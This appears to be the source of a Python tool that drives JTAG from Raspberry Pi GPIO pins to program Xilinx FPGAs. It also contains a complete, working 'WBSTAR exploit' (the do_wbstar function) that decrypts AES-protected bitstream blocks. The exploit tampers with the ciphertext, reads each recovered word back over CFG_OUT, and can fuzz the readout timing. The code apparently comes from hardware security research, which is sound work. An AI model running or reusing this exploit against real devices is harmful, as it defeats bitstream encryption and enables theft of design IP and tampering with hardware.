#!/usr/bin/python3

try:
    import RPi.GPIO as GPIO
except RuntimeError:
    print("Error importing RPi.GPIO! Did you run as root?")

import csv
import argparse
import time
import subprocess
import logging
import sys
import binascii
from Crypto.Cipher import AES

from enum import Enum

from cffi import FFI
try:
    from gpioffi.lib import pi_mmio_init
except:
    print('Note: FFI library missing, rebuilding...')
    subprocess.call(['python3', 'build.py'])
    print('Please try the command again.')
    exit(1)
from gpioffi.lib import jtag_pins
from gpioffi.lib import jtag_prog

TCK_pin = 4
TMS_pin = 17
TDI_pin = 27  # TDI on FPGA, out for this script
TDO_pin = 22  # TDO on FPGA, in for this script

class JtagLeg(Enum):
    DR = 0
    IR = 1
    RS = 2 # reset
    DL = 3 # long delay
    ID = 4 # idle in run-test
    IRP = 5  # IR with pause
    IRD = 6  # transition to IR directly
    DRC = 7  # DR for config: MSB-to-LSB order, and use fast protocols
    DRR = 8  # DR for recovery: print out the value returned in non-debug modes

class JtagState(Enum):
    TEST_LOGIC_RESET = 0
    RUN_TEST_IDLE = 1
    SELECT_SCAN = 2
    CAPTURE = 3
    SHIFT = 4
    EXIT1 = 5
    PAUSE = 6
    EXIT2 = 7
    UPDATE = 8

state = JtagState.RUN_TEST_IDLE
cur_leg = []
jtag_legs = []
tdo_vect = ''
jtag_results = []
do_pause = False
gpio_pointer = 0
keepalive = []
compat = False
readout = False
readdata = 0
use_key = False
nky_key = ''
nky_iv = ''
nky_hmac =''
use_fuzzer = False

def phy_sync(tdi, tms):
    global TCK_pin, TMS_pin, TDI_pin, TDO_pin

    if compat:
        tdo = GPIO.input(TDO_pin) # grab the TDO value before the clock changes
    
        GPIO.output( (TCK_pin, TDI_pin, TMS_pin), (0, tdi, tms) )
        GPIO.output( (TCK_pin, TDI_pin, TMS_pin), (1, tdi, tms) )
        GPIO.output( (TCK_pin, TDI_pin, TMS_pin), (0, tdi, tms) )
    else:
        tdo = jtag_pins(tdi, tms, gpio_pointer)

    return tdo


def decode_ir(ir):
    if ir == 0b100110:
        return 'EXTEST'
    elif ir == 0b111100:
        return 'EXTEST_PULSE'
    elif ir == 0b111101:
        return 'EXTEST_TRAIN'
    elif ir == 0b000001:
        return 'SAMPLE'
    elif ir == 0b000010:
        return 'USER1'
    elif ir == 0b000011:
        return 'USER2'
    elif ir == 0b100010:
        return 'USER3'
    elif ir == 0b100011:
        return 'USER4'
    elif ir == 0b000100:
        return 'CFG_OUT'
    elif ir == 0b000101:
        return 'CFG_IN'
    elif ir == 0b001001:
        return 'IDCODE'
    elif ir == 0b001010:
        return 'HIGHZ_IO'
    elif ir == 0b001011:
        return 'JPROGRAM'
    elif ir == 0b001100:
        return 'JSTART'
    elif ir == 0b001101:
        return 'JSHUTDOWN'
    elif ir == 0b110111:
        return 'XADC_DRP'
    elif ir == 0b010000:
        return 'ISC_ENABLE'
    elif ir == 0b010001:
        return 'ISC_PROGRAM'
    elif ir == 0b010010:
        return 'XSC_PROGRAM_KEY'
    elif ir == 0b010111:
        return 'XSC_DNA'
    elif ir == 0b110010:
        return 'FUSE_DNA'
    elif ir == 0b010100:
        return 'ISC_NOOP'
    elif ir == 0b010110:
        return 'ISC_DISABLE'
    elif ir == 0b111111:
        return 'BYPASS'
    elif ir == 0b110001:
        return 'FUSE_KEY'
    elif ir == 0b110011:
        return 'FUSE_USER'
    elif ir == 0b110100:
        return 'FUSE_CNTL'
    else:
        return ''  # unknown just leave blank for now

def debug_spew(cur_leg):
    
    if cur_leg[0] != JtagLeg.DRC:
        logging.debug("start: %s (%s) / %s", str(cur_leg), str(decode_ir(int(cur_leg[1],2))), str(cur_leg[2]) )
    else:
        logging.debug("start: %s config data of length %s", cur_leg[0], str(len(cur_leg[1])))

# take a trace and attempt to extract IR, DR values
# assume: at the start of each 'trace' we are coming from TEST-LOGIC-RESET
def jtag_step():
    global state
    global cur_leg
    global jtag_legs
    global jtag_results
    global tdo_vect
    global do_pause
    global TCK_pin, TMS_pin, TDI_pin, TDO_pin
    global gpio_pointer
    global keepalive
    global compat
    global readout
    global readdata

    # logging.debug(state)
    if state == JtagState.TEST_LOGIC_RESET:
        phy_sync(0, 0)
        state = JtagState.RUN_TEST_IDLE

    elif state == JtagState.RUN_TEST_IDLE:
        if len(cur_leg):
            # logging.debug(cur_leg[0])
            if cur_leg[0] == JtagLeg.DR or cur_leg[0] == JtagLeg.DRC or cur_leg[0] == JtagLeg.DRR:
                phy_sync(0, 1)
                if cur_leg[0] == JtagLeg.DRR:
                    readout = True
                else:
                    readout = False
                state = JtagState.SELECT_SCAN
            elif cur_leg[0] == JtagLeg.IR or cur_leg[0] == JtagLeg.IRD:
                phy_sync(0, 1)
                phy_sync(0, 1)
                do_pause = False
                state = JtagState.SELECT_SCAN
            elif cur_leg[0] == JtagLeg.IRP:
                phy_sync(0, 1)
                phy_sync(0, 1)
                do_pause = True
                state = JtagState.SELECT_SCAN
            elif cur_leg[0] == JtagLeg.RS:
                logging.debug("tms reset")
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                phy_sync(0, 1)
                cur_leg = jtag_legs.pop(0)
                debug_spew(cur_leg)
                state = JtagState.TEST_LOGIC_RESET
            elif cur_leg[0] == JtagLeg.DL:
                time.sleep(0.005) # 5ms delay
                cur_leg = jtag_legs.pop(0)
                debug_spew(cur_leg)
            elif cur_leg[0] == JtagLeg.ID:
                phy_sync(0, 0)
                cur_leg = jtag_legs.pop(0)
                debug_spew(cur_leg)
        else:
            if len(jtag_legs):
                cur_leg = jtag_legs.pop(0)
                debug_spew(cur_leg)
            else:
                phy_sync(0, 0)
            state = JtagState.RUN_TEST_IDLE
            
    elif state == JtagState.SELECT_SCAN:
        phy_sync(0, 0)
        state = JtagState.CAPTURE

    elif state == JtagState.CAPTURE:
        phy_sync(0, 0)
        tdo_vect = ''  # prep the tdo_vect to receive data
        state = JtagState.SHIFT

    elif state == JtagState.SHIFT:
        if cur_leg[0] == JtagLeg.DRC:
            if compat:
                for bit in cur_leg[1][:-1]:
                   if bit == '1':
                      GPIO.output( (TCK_pin, TDI_pin), (0, 1) )
                      GPIO.output( (TCK_pin, TDI_pin), (1, 1) )
                   else:
                      GPIO.output( (TCK_pin, TDI_pin), (0, 0) )
                      GPIO.output( (TCK_pin, TDI_pin), (1, 0) )
            else:
                bytestr = bytes(cur_leg[1][:-1], 'utf-8')
                ffi = FFI()
                ffistr = ffi.new("char[]", bytestr)
                keepalive.append(ffistr) # need to make sure the lifetime of the string is long enough for the call
                jtag_prog(ffistr, gpio_pointer)
                GPIO.output( TCK_pin, 0 ) # restore this to 0, as jtag_prog() leaves TCK high when done
                
            state = JtagState.SHIFT

            if cur_leg[-1:] == '1':
                tdi = 1
            else:
                tdi = 0
            cur_leg = ''
            phy_sync(tdi, 1) # skip recording the output
            tdo_vect = '0'
            state = JtagState.EXIT1
            logging.debug('leaving config')
            
        else:
            if len(cur_leg[1]) > 1:
                if cur_leg[1][-1] == '1':
                    tdi = 1
                else:
                    tdi = 0
                cur_leg[1] = cur_leg[1][:-1]
                tdo = phy_sync(tdi, 0)
                if tdo == 1:
                    tdo_vect = '1' + tdo_vect
                else:
                    tdo_vect = '0' + tdo_vect
                state = JtagState.SHIFT
            else: # this is the last item
                if cur_leg[1][0] == '1':
                    tdi = 1
                else:
                    tdi = 0
                cur_leg = ''
                tdo = phy_sync(tdi, 1)
                if tdo == 1:
                    tdo_vect = '1' + tdo_vect
                else:
                    tdo_vect = '0' + tdo_vect
                state = JtagState.EXIT1

    elif state == JtagState.EXIT1:
        if do_pause:
           phy_sync(0, 0)
           state = JtagState.PAUSE
           do_pause = False
        else:
           phy_sync(0, 1)        
           state = JtagState.UPDATE

    elif state == JtagState.PAUSE:
        logging.debug("pause")
        # we could put more pauses in here but we haven't seen this needed yet
        phy_sync(0, 1)        
        state = JtagState.EXIT2

    elif state == JtagState.EXIT2:
        phy_sync(0, 1)        
        state = JtagState.UPDATE

    elif state == JtagState.UPDATE:
        jtag_results.append(int(tdo_vect, 2)) # interpret the vector and save it
        logging.debug("result: %s", str(hex(int(tdo_vect, 2))) )
        if readout:
            #print('readout: 0x{:08x}'.format( int(tdo_vect, 2) ) )
            readdata = int(tdo_vect, 2)
            readout = False
        tdo_vect = ''

        # handle case of "shortcut" to DR
        if len(jtag_legs):
            if (jtag_legs[0][0] == JtagLeg.DR) or (jtag_legs[0][0] == JtagLeg.IRP) or (jtag_legs[0][0] == JtagLeg.IRD):
                if jtag_legs[0][0] == JtagLeg.IRP or jtag_legs[0][0] == JtagLeg.IRD:
                    phy_sync(0, 1)  # +1 cycle on top of the DR cycle below
                    logging.debug("IR bypassing wait state")
                if jtag_legs[0][0] == JtagLeg.IRP:
                    do_pause = True
                    
                cur_leg = jtag_legs.pop(0)
                debug_spew(cur_leg)
                phy_sync(0,1)
                state = JtagState.SELECT_SCAN
            else:
                phy_sync(0, 0)        
                state = JtagState.RUN_TEST_IDLE
        else:
            phy_sync(0, 0)        
            state = JtagState.RUN_TEST_IDLE

    else:
        print("Illegal state encountered!")

def jtag_next():
    global state
    global jtag_results

    if state == JtagState.TEST_LOGIC_RESET or state == JtagState.RUN_TEST_IDLE:
        if len(jtag_legs):
            # run until out of idle
            while state == JtagState.TEST_LOGIC_RESET or state == JtagState.RUN_TEST_IDLE:
                jtag_step()

            # run to idle
            while state != JtagState.TEST_LOGIC_RESET and state != JtagState.RUN_TEST_IDLE:
                jtag_step()
        else:
            # this should do nothing
            jtag_step()
    else:
        # we're in a leg, run to idle
        while state != JtagState.TEST_LOGIC_RESET and state != JtagState.RUN_TEST_IDLE:
            jtag_step()

def do_bitstream(ifile):
    global jtag_legs
    
    with open(ifile, "rb") as f:
        binfile = f.read()

        position = 0
        while position < len(binfile):
            sync = int.from_bytes(binfile[position:position+4], 'big')
            if sync == 0xaa995566:
                break
            position = position + 1

        config_data = bin(int.from_bytes(binfile[position:], byteorder='big'))[2:]
        
        jtag_legs.append([JtagLeg.RS, '0', 'reset'])
        jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
        jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
        jtag_legs.append([JtagLeg.RS, '0', 'reset'])
        jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
        jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
        jtag_legs.append([JtagLeg.DL, '0', 'initdelay'])
        jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
        jtag_legs.append([JtagLeg.RS, '0', 'reset'])
        jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
        jtag_legs.append([JtagLeg.DRC, config_data, 'config_data'])
        jtag_legs.append([JtagLeg.RS, '0', 'reset'])
        jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
        jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])

"""
Reverse the order of bits in a word that is bitwidth bits wide
"""
def bitflip(data_block, bitwidth=32):
    if bitwidth == 0:
        return data_block

    bytewidth = bitwidth // 8
    bitswapped = bytearray()

    i = 0
    while i < len(data_block):
        data = int.from_bytes(data_block[i:i+bytewidth], byteorder='big', signed=False)
        b = '{:0{width}b}'.format(data, width=bitwidth)
        bitswapped.extend(int(b[::-1], 2).to_bytes(bytewidth, byteorder='big'))
        i = i + bytewidth

    return bytes(bitswapped)


def do_wbstar(ifile, offset):
    global readdata
    global use_key, nky_key, nky_iv, nky_hmac, use_fuzzer
    
    if offset < 1:
        print("Offset {} is too small. Must be greater than 0.".format(offset))
        exit(0)
        
    with open(ifile, "rb") as f:
        binfile = bytearray(f.read())
    
        # search for structure
        # 0x3001_6004 -> specifies the CBC key
        # 4 words of CBC IV
        # 0x3003_4001 -> ciphertext len
        # 1 word of ciphertext len
        # then ciphertext

        position = 0
        iv_pos = 0
        sync_pos = 0
        while position < len(binfile):
            cwd = int.from_bytes(binfile[position:position+4], 'big')
            if cwd == 0x30016004:
                iv_pos = position+4
            if cwd == 0x30034001:
                break
            if cwd == 0xaa995566:
                sync_pos = position
            position = position + 1

        position = position + 4

        ciphertext_len = 4* int.from_bytes(binfile[position:position+4], 'big')
        logging.debug("original ciphertext len: %d", ciphertext_len)

        # patch a new length in, which is 0x98
        binfile[position+0] = 0x0
        binfile[position+1] = 0x0
        binfile[position+2] = 0x0
        binfile[position+3] = 0x98
        
        cipherstart = position + 4

        # we don't use this, but it's neat to see.
        iv_bytes = bitflip(binfile[iv_pos : iv_pos+0x10])  # note that the IV is embedded in the file
        logging.debug("recovered iv: %s", binascii.hexlify(iv_bytes))

        recovered = [0,0,0,0]
        block = [0,0,0,0]

        if use_fuzzer:
            fuzz_min = 0
            fuzz_max = 0x98
        else:
            fuzz_min = 126 # determined through fuzzing
            fuzz_max = 127

        for ro_fuzz in range(fuzz_min, fuzz_max):
           for word_index in range(0, 4):
              # copy attack area as template
              attack_area = binfile[sync_pos:cipherstart + 0x98*4] # from HMAC header to end of "configuration footer"
              attack_cipherstart = cipherstart - sync_pos # subtract out the sync_pos offset

              # mutate the WBSTAR write length
              # 0xD selects the third word in the AES block; 0x1 is there originally, so much XOR that out
              wbstar_patch = 0xd - word_index
              attack_area[attack_cipherstart + 0x3b] = attack_area[attack_cipherstart + 0x3b] ^ wbstar_patch ^ 0x1

              # copy in the IV + target block
              dest = attack_cipherstart + 6*16  # 6x 16-byte AES blocks
              for source in range( sync_pos + attack_cipherstart + (offset-1)*16,
                                   sync_pos + attack_cipherstart + (offset+1)*16 ):
                  attack_area[dest] = binfile[source]
                  dest = dest + 1

              # patch in 0x2000_0000 (NOP) command over words as they are decrypted to prevent errant commands to fabric
              for patch in range(0, word_index):
                  attack_area[attack_cipherstart + 0x6c - 4*patch] ^= (((recovered[3-patch] >> 24) & 0xff) ^ 0x20)
                  attack_area[attack_cipherstart + 0x6d - 4*patch] ^= (((recovered[3-patch] >> 16) & 0xff) ^ 0x00)
                  attack_area[attack_cipherstart + 0x6e - 4*patch] ^= (((recovered[3-patch] >>  8) & 0xff) ^ 0x00)
                  attack_area[attack_cipherstart + 0x6f - 4*patch] ^= (((recovered[3-patch] >>  0) & 0xff) ^ 0x00)

              # attack_area now contains the data to configure
              debug = False
              if debug:
                  i = 0
                  for b in attack_area:
                      if i % 32 == 0:
                          print(" ")
                      i = i + 1
                      print("{:02x} ".format(b), end='')
                  print(" ")
                  with open("check{}.bin".format(word_index), "wb") as check:
                      check.write(attack_area)
              # run the attack
              attack_bits = bin(int.from_bytes(attack_area, byteorder='big'))[2:]
              jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
              jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
              jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
              jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
              jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
              jtag_legs.append([JtagLeg.RS, '0', 'reset'])
              jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
              jtag_legs.append([JtagLeg.DRC, attack_bits, 'attack_data'])
              jtag_legs.append([JtagLeg.RS, '0', 'reset'])
              jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
              jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])

              while len(jtag_legs):
                 jtag_next()

              if use_key:
                  key_bytes = int(nky_key, 16).to_bytes(32, byteorder='big')
                  logging.debug("key: %s", binascii.hexlify(key_bytes))
                  with open(ifile, "rb") as ro:
                       ro_bytes = bytearray(ro.read())
                       ro_pos = 0
                       ro_sync_pos = 0
                       while ro_pos < len(ro_bytes):
                           cwd = int.from_bytes(ro_bytes[ro_pos:ro_pos+4], 'big')
                           if cwd == 0xaa995566:
                               ro_sync_pos = ro_pos
                           if cwd == 0x30034001:
                               break
                           if cwd == 0x30016004:
                               ro_iv_pos = ro_pos+4
                           ro_pos = ro_pos + 1
                       ro_desired_len = 0x98 # 0x10
                       ro_pos = ro_pos + 4
                       ro_bytes[ro_pos+0] = 0x0
                       ro_bytes[ro_pos+1] = 0x0
                       ro_bytes[ro_pos+2] = 0x0
                       ro_bytes[ro_pos+3] = ro_desired_len
                       ro_cipherstart = ro_pos+4
                       ro_iv_bytes = bitflip(ro_bytes[ro_iv_pos : ro_iv_pos+0x10])
                       logging.debug("recovered ro iv: %s", binascii.hexlify(ro_bytes[ro_iv_pos : ro_iv_pos+0x10]))
                       logging.debug("recovered ro iv (flipped): %s", binascii.hexlify(ro_iv_bytes))

                       ro_area = ro_bytes[ro_sync_pos:ro_cipherstart + ro_desired_len*4]

                       cipher = AES.new(key_bytes, AES.MODE_CBC, ro_iv_bytes)

                       if False:  # these are static readout bitstreams, not used but kept around for future reference
                           # code is 512 bits long
                           if True:
                                readout_code = 0xaa995566200000002802000120000000200000002000000020000000200000002000000020000000200000002000000020000000200000002000000020000000
                                readout_len = 64
                           else:
                                readout_code = 0x2000000020000000ffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000
                                readout_len = 96

                           readout_pad = ro_desired_len - readout_len//4

                           plaintext = bytearray()
                           plaintext += bytearray(readout_code.to_bytes(readout_len, byteorder='big'))
                           for i in range(0, readout_pad):
                               plaintext += int(0x20000000).to_bytes(4, byteorder='big')
                       else: # dynamically generate the readout bitstream to fuzz the timing
                           read_wbstar = 0x28020001 # wbstar 0x28020001 / idcode 0x28018001
                           nop         = 0x20000000
                           sync        = 0xaa995566
                           plaintext = bytearray()
                           for i in range(0, ro_desired_len):
                               if i == 0:
                                   plaintext += int(sync).to_bytes(4, byteorder='big')
                               elif i == ro_desired_len - ro_fuzz:
                                   plaintext += int(read_wbstar).to_bytes(4, byteorder='big')
                               else:
                                   plaintext += int(nop).to_bytes(4, byteorder='big')

                       readout_crypt = bitflip(cipher.encrypt(bitflip(plaintext)))
                       i = ro_cipherstart - ro_sync_pos
                       for b in readout_crypt:
                           ro_area[i] = b
                           i = i + 1

                       readout_cmd = bin(int.from_bytes(ro_area, byteorder='big'))[2:]
                       i = 0
                       if debug:
                           for b in ro_area:
                               if i % 32 == 0:
                                   print(" ")
                               i = i + 1
                               print("{:02x} ".format(b), end='')
                           print(" ")
                           with open("check-ro.bin".format(word_index), "wb") as check:
                              check.write(ro_area)
                              
                       jtag_legs.append([JtagLeg.IR, '001001', 'idcode'])
                       jtag_legs.append([JtagLeg.DR, '00000000000000000000000000000000', ' '])
                       #jtag_legs.append([JtagLeg.IR, '001011', 'jprogram'])
                       #jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
                       #jtag_legs.append([JtagLeg.IR, '010100', 'isc_noop'])
                       #jtag_legs.append([JtagLeg.RS, '0', 'reset'])
                       jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
                       jtag_legs.append([JtagLeg.DRC, readout_cmd, 'readout_command'])
                       jtag_legs.append([JtagLeg.IRD, '000100', 'cfg_out'])
                       jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
                       jtag_legs.append([JtagLeg.RS, '0', 'reset'])
                       jtag_legs.append([JtagLeg.IR, '010100', 'noop'])

                       while len(jtag_legs):
                          jtag_next()

                       if use_fuzzer:
                           print("Read command offset {} recovered word: {}".format(str(ro_fuzz), hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
                       else:
                           logging.debug("Recovered word at %s: %s", str(ro_fuzz), hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
                       recovered[3-word_index] = readdata
                       block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')

              else:
                  ### preferred command
                  readout_cmd = bin(0xaa99556620000000280200012000000020000000)[2:]
                  ### command as from Ender paper
                  # readout_cmd = bin(0xffffffffffffffffffffffffffffffffffffffffffffffff000000bb11220044ffffffffffffffffaa9955662000000030008001000000042000000020000000200000002802000120000000200000002000000020000000)[2:]

                  # now perform the readout
                  jtag_legs.append([JtagLeg.RS, '0', 'reset'])
                  jtag_legs.append([JtagLeg.IRD, '000101', 'cfg_in'])
                  jtag_legs.append([JtagLeg.DRC, readout_cmd, 'readout_command'])
                  jtag_legs.append([JtagLeg.IR, '000100', 'cfg_out'])
                  jtag_legs.append([JtagLeg.DRR, '00000000000000000000000000000000', 'readout'])
                  jtag_legs.append([JtagLeg.RS, '0', 'reset'])
                  jtag_legs.append([JtagLeg.IR, '010100', 'noop'])

                  while len(jtag_legs):
                     jtag_next()

                  print("Recovered word at {}: {}".format(ro_fuzz, hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big'))))
                  logging.debug("Recovered word: %s", hex(int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')))
                  recovered[3-word_index] = readdata
                  block[3-word_index] = int.from_bytes(bitflip(readdata.to_bytes(4, byteorder='big')), byteorder='big')

        print('AES block {} is 0x{:08x}{:08x}{:08x}{:08x}'.format(offset, block[0], block[1], block[2], block[3]))
        
        
def main():
    global TCK_pin, TMS_pin, TDI_pin, TDO_pin
    global jtag_legs, jtag_results
    global gpio_pointer
    global compat
    global use_key, nky_key, nky_iv, nky_hmac, use_fuzzer

    parser = argparse.ArgumentParser(description="Drive JTAG via Rpi GPIO")
    parser.add_argument(
        "-f", "--file", required=True, help="file containing jtag command list or bitstream", type=str
    )
    parser.add_argument(
        "-b", "--bitstream", default=False, action="store_true", help="input file is a bitstream, not a JTAG command set"
    )
    parser.add_argument(
        "-w", "--wbstar", help="Decode one AES block using WBSTAR exploit. Offset is specified in units of 128-bit blocks.", type=int
    )
    parser.add_argument(
        "-c", "--compat", default=False, action="store_true", help="Use compatibility mode (warning: about 100x slower than FFI)"
    )
    parser.add_argument(
        "-d", "--debug", help="turn on debugging spew", default=False, action="store_true"
    )
    parser.add_argument(
        '--tdi', type=int, help="Specify TDI GPIO. Defaults to 27", default=27
    )
    parser.add_argument(
        '--tdo', type=int, help="Specify TDO GPIO. Defaults to 22", default=22
    )
    parser.add_argument(
        '--tms', type=int, help="Specify TMS GPIO. Defaults to 17", default=17
    )
    parser.add_argument(
        '--tck', type=int, help="Specify TCK GPIO. Defaults to 4", default=4
    )
    parser.add_argument(
        "-i", "--input-key", help="Use specified .nky file to create readout command", type=str
    )
    parser.add_argument(
        "-p", "--phuzz", help="Fuzz readout addresses on wbstar exploit with encrypted readout commands", default=False, action="store_true"
    )
    args = parser.parse_args()
    if args.debug:
       logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
                
    ifile = args.file
    compat = args.compat

    if TCK_pin != args.tck:
        compat = True
        TCK_pin = args.tck
    if TDI_pin != args.tdi:
        compat = True
        TDI_pin = args.tdi
    if TDO_pin != args.tdo:
        compat = True
        TDO_pin = args.tdo
    if TMS_pin != args.tms:
        compat = True
        TMS_pin = args.tms

    if compat == True and args.compat == False:
        print("Compatibility mode triggered because one of tck/tdi/tdo/tms pins do not match the CFFI bindings")
        print("To fix this, edit gpio-ffi.c and change the #define's to match your bindings, and update the ")
        print("global defaults to the pins in this file, specified just after the imports.")

    # extract the original key, HMAC, and IV
    if args.input_key != None:
        if args.phuzz:
            use_fuzzer = True
        with open(args.input_key, "r") as nky:
            use_key = True
            for lines in nky:
                line = lines.split(' ')
                if line[1] == '0':
                    nky_key = line[2].rstrip().rstrip(';')
                if line[1] == 'StartCBC':
                    nky_iv = line[2].rstrip().rstrip(';')
                if line[1] == 'HMAC':
                    nky_hmac = line[2].rstrip().rstrip(';')

    rev = GPIO.RPI_INFO
    if rev['P1_REVISION'] == 1:
       gpio_pointer = pi_mmio_init(0x20000000)
    elif rev['P1_REVISION'] == 3 or rev['P1_REVISION'] == 2:
       gpio_pointer = pi_mmio_init(0x3F000000)
    elif rev['P1_REVISION'] == 4:
       gpio_pointer = pi_mmio_init(0xFE000000)
    else:
        print("Unknown Raspberry Pi rev, can't set GPIO base")
        compat = True

    if args.bitstream:
        print('Programming .bin file to FPGA:', ifile)
    elif args.wbstar:
        print('Decrypting AES blocks from file: ', ifile)
    else:
        print('Executing .jtg command file:', ifile)
        
    GPIO.setmode(GPIO.BCM)

    GPIO.setup((TCK_pin, TMS_pin, TDI_pin), GPIO.OUT)
    GPIO.setup(TDO_pin, GPIO.IN)

    if args.wbstar != None:
        do_wbstar(ifile, args.wbstar)
        GPIO.cleanup()
        exit(0)
        
    if args.bitstream:
        do_bitstream(ifile)
        while len(jtag_legs):
           jtag_next()
        GPIO.cleanup()
        exit(0)
        

    # CSV file format
    # chain, width, value:
    # IR, 6, 0b110110
    # DR, 64, 0x0
    with open(ifile) as csvfile:
        reader = csv.reader(csvfile, delimiter=',')

        for row in reader:
            if len(row) < 3:
                continue
            chain = str(row[0]).lower().strip()
            if chain[0] == '#':
                continue
            length = int(row[1])
            if str(row[2]).strip()[:2] == '0x':
                value = int(row[2], 16)
            elif str(row[2]).strip()[:2] == '0b':
                value = int(row[2], 2)
            else:
                value = int(row[2])

            if (chain != 'dr') & (chain != 'ir') & (chain != 'rs') & (chain != 'dl') & \
               (chain != 'id') & (chain != 'irp') & (chain != 'ird') & (chain != 'drc') & (chain != 'drr'):
                print('unknown chain type ', chain, ' aborting!')
                GPIO.cleanup()
                exit(1)

            # logging.debug('found JTAG chain ', chain, ' with len ', str(length), ' and data ', hex(value))
            if chain == 'rs':
                jtag_legs.append([JtagLeg.RS, '0', '0'])
            elif chain == 'dl':
                jtag_legs.append([JtagLeg.DL, '0', '0'])
            elif chain == 'id':
                jtag_legs.append([JtagLeg.ID, '0', '0'])

            else:
                if chain == 'dr':
                    code = JtagLeg.DR
                elif chain == 'drc':
                    code = JtagLeg.DRC
                elif chain == 'drr':
                    code = JtagLeg.DRR
                elif chain == 'ir':
                    code = JtagLeg.IR
                elif chain == 'ird':
                    code = JtagLeg.IRD
                else:
                    code = JtagLeg.IRP
                if len(row) > 3:
                    jtag_legs.append([code, '%0*d' % (length, int(bin(value)[2:])), row[3]])
                else:
                    jtag_legs.append([code, '%0*d' % (length, int(bin(value)[2:])), ' '])            
    # logging.debug(jtag_legs)

    while len(jtag_legs):
        # time.sleep(0.002) # give 2 ms between each command
        jtag_next()
        
#        while len(jtag_results):
#            result = jtag_result.pop()
            # printout happens in situ

    GPIO.cleanup()
    exit(0)

if __name__ == "__main__":
    main()
